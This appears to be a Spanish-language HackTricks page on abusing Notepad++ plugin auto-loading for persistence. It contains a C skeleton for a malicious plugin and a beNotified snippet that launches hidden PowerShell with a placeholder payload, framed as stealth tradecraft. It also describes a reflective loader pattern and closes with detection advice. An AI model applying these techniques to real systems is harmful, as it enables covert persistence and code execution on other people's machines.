# Persistencia y ejecución mediante carga automática de plugins de Notepad++

{{#include ../../banners/hacktricks-training.md}}

Notepad++ **carga automáticamente todos los archivos DLL de plugins que encuentra en sus subcarpetas `plugins`** al iniciarse. Colocar un plugin malicioso en cualquier **instalación de Notepad++ con permisos de escritura** permite ejecutar código dentro de `notepad++.exe` cada vez que se inicia el editor, lo que puede aprovecharse para lograr **persistencia**, una **ejecución inicial** sigilosa o usarlo como **cargador en proceso** si el editor se inicia con privilegios elevados.<sup>[[1]](#references)</sup>

Desde **Notepad++ 7.6+**, la estructura prevista para la instalación manual es **una subcarpeta por plugin** (`plugins\<PluginName>\<PluginName>.dll`). En **modo portátil** (cuando existe `doLocalConf.xml` junto a `notepad++.exe`), todo el árbol de la aplicación permanece en ese directorio, lo que a menudo convierte los paquetes de herramientas copiados o de administración en una superficie de ejecución fácilmente accesible para escritura por parte del usuario.<sup>[[2]](#references)</sup>

## Ubicaciones de plugins con permisos de escritura

- Instalación estándar: `C:\Program Files\Notepad++\plugins\<PluginName>\<PluginName>.dll` (normalmente se requieren privilegios de administrador para escribir).<sup>[[1]](#references)</sup>
- Opciones con permisos de escritura para operadores con pocos privilegios:<sup>[[1]](#references)</sup>
  - Usar la **versión portátil de Notepad++** en una carpeta con permisos de escritura para el usuario.
  - Copiar `C:\Program Files\Notepad++` a una ruta controlada por el usuario (p. ej., `%LOCALAPPDATA%\npp\`) y ejecutar `notepad++.exe` desde allí.
  - Buscar **paquetes de herramientas de administración**, copias extraídas de archivos zip o kits de herramientas de soporte técnico que ya contengan `doLocalConf.xml` y estén fuera de `Program Files`.
- Cada plugin tiene su propia subcarpeta dentro de `plugins` y se carga automáticamente al inicio; las entradas de menú aparecen en **Plugins**.<sup>[[2]](#references)</sup>

Triaje rápido:

```cmd
where /r C:\ notepad++.exe 2>nul
for /d %D in ("%ProgramFiles%\Notepad++" "%ProgramFiles(x86)%\Notepad++" "%LOCALAPPDATA%\*notepad*" "%USERPROFILE%\Desktop\*notepad*") do @if exist "%~fD\plugins" echo [*] %~fD
icacls "C:\Program Files\Notepad++\plugins" 2>nul
```

## Puntos de carga del plugin (primitivas de ejecución)
Notepad++ espera **funciones exportadas** específicas. Todas se llaman durante la inicialización, lo que proporciona varias superficies de ejecución:<sup>[[1]](#references)</sup>
- **`DllMain`** — se ejecuta inmediatamente al cargar la DLL (primer punto de ejecución).
- **`setInfo(NppData)`** — se llama una vez durante la carga para proporcionar los identificadores de Notepad++; es un lugar habitual para registrar elementos de menú.
- **`getName()`** — devuelve el nombre del plugin que se muestra en el menú.
- **`getFuncsArray(int *nbF)`** — devuelve los comandos del menú; aunque esté vacío, se llama durante el inicio.
- **`beNotified(SCNotification*)`** — recibe eventos de Notepad++ / Scintilla (útil para posponer payloads hasta una acción del usuario o un evento del editor).
- **`messageProc(UINT, WPARAM, LPARAM)`** — controlador de mensajes, útil para intercambios de datos más grandes.
- **`isUnicode()`** — indicador de compatibilidad que se comprueba durante la carga.

La mayoría de las funciones exportadas pueden implementarse como **stubs**; la ejecución puede producirse desde `DllMain` o cualquiera de las funciones de callback anteriores durante la carga automática.

## Esqueleto mínimo de un plugin malicioso
Compila una DLL con las funciones exportadas esperadas y colócala en `plugins\\MyNewPlugin\\MyNewPlugin.dll` dentro de una carpeta de Notepad++ con permisos de escritura:<sup>[[1]](#references)</sup>

```c
BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID) { if (r == DLL_PROCESS_ATTACH) MessageBox(NULL, TEXT("Hello from Notepad++"), TEXT("MyNewPlugin"), MB_OK); return TRUE; }
extern "C" __declspec(dllexport) void setInfo(NppData) {}
extern "C" __declspec(dllexport) const TCHAR *getName() { return TEXT("MyNewPlugin"); }
extern "C" __declspec(dllexport) FuncItem *getFuncsArray(int *nbF) { *nbF = 0; return NULL; }
extern "C" __declspec(dllexport) void beNotified(SCNotification *) {}
extern "C" __declspec(dllexport) LRESULT messageProc(UINT, WPARAM, LPARAM) { return TRUE; }
extern "C" __declspec(dllexport) BOOL isUnicode() { return TRUE; }
```

1. Compila la DLL (Visual Studio/MinGW).
2. Crea la subcarpeta del plugin dentro de `plugins` y coloca la DLL dentro.
3. Reinicia Notepad++; la DLL se carga automáticamente, ejecutando `DllMain` y las callbacks posteriores.

## Patrón de activación de bajo ruido mediante `beNotified`
Por OPSEC, muchos payloads **no** deberían ejecutarse desde `DllMain`. Un patrón más discreto consiste en dejar que el plugin se cargue correctamente y ejecutarlo solo después de un evento realista del editor, como **la finalización del inicio**, **la activación de un búfer** o **el primer carácter escrito**.

```c
static bool fired = false;
extern "C" __declspec(dllexport) void beNotified(SCNotification *n) {
  if (fired) return;
  if (n->nmhdr.code == NPPN_READY ||
      n->nmhdr.code == NPPN_BUFFERACTIVATED ||
      n->nmhdr.code == SCN_CHARADDED) {
    fired = true;
    WinExec("powershell -w hidden -nop -c <payload>", SW_HIDE);
  }
}
```

Esto se ajusta mejor a la investigación ofensiva pública que un beacon ruidoso en `DllMain`: la DLL sigue cargándose automáticamente al inicio, pero la acción maliciosa se retrasa hasta que Notepad++ parece estar realmente en uso.

## Usar el directorio de configuración de plugins como almacenamiento secundario
Notepad++ expone `NPPM_GETPLUGINSCONFIGDIR`, que devuelve el **directorio de configuración de plugins del usuario actual**.<sup>[[3]](#references)</sup> Un plugin malicioso puede usarlo para mantener la DLL en disco mínima mientras almacena configuración cifrada, payloads preparados o archivos de tasking en una ruta que se confunda con el estado normal de los plugins.

```c
wchar_t cfg[MAX_PATH] = {0};
SendMessage(nppData._nppHandle, NPPM_GETPLUGINSCONFIGDIR, MAX_PATH, (LPARAM)cfg);
// Example result: %AppData%\Notepad++\plugins\config
```

Operativamente, esto resulta útil cuando quieres:
- una DLL bootstrap pequeña que se cargue automáticamente;
- tasking por usuario sin volver a modificar el binario principal del plugin;
- separar el **disparador de carga automática** de la segunda etapa, más pesada.

## Patrón de plugin Reflective loader
Un plugin weaponized puede convertir Notepad++ en un **reflective DLL loader**:<sup>[[1]](#references)</sup>
- Mostrar una interfaz de usuario/entrada de menú mínima (p. ej., "LoadDLL").
- Aceptar una **ruta de archivo** o una **URL** para obtener una DLL payload.
- Mapear la DLL de forma reflectiva en el proceso actual e invocar un punto de entrada exportado (p. ej., una función loader dentro de la DLL obtenida).
- Ventaja: reutilizar un proceso GUI de apariencia legítima en vez de iniciar un loader nuevo; el payload hereda el nivel de integridad de `notepad++.exe` (incluidos los contextos elevados).
- Desventajas: escribir en disco un **plugin DLL sin firmar** genera ruido; una variación práctica consiste en usar el plugin cargado automáticamente solo como stub y mantener el implant real cifrado o preparado en otra ubicación.

## Notas de detección y hardening
- Bloquear o supervisar las **escrituras en los directorios de plugins de Notepad++** (incluidas las copias portables en perfiles de usuario); habilitar el acceso controlado a carpetas o la lista de permitidos de aplicaciones.
- Generar alertas ante **nuevas DLL sin firmar** en `plugins`, cambios en árboles de Notepad++ portable y **procesos secundarios/actividad de red** inusuales de `notepad++.exe`.
- Crear una línea base de los plugins legítimos e investigar cualquier DLL nueva que exporte la interfaz normal de plugins de Notepad++ y que también inicie shells, PowerShell o beacons de red.
- Exigir que la instalación de plugins se realice únicamente mediante **Plugins Admin** y restringir la ejecución de copias portables desde rutas que no sean de confianza.

## References

- [1] [TrustedSec - Notepad++ Plugins: Plug and Payload](https://trustedsec.com/blog/notepad-plugins-plug-and-payload)
- [2] [Notepad++ User Manual - Plugins](https://npp-user-manual.org/docs/plugins/)
- [3] [Notepad++ User Manual - Plugin Communication](https://npp-user-manual.org/docs/plugin-communication/)
{{#include ../../banners/hacktricks-training.md}}
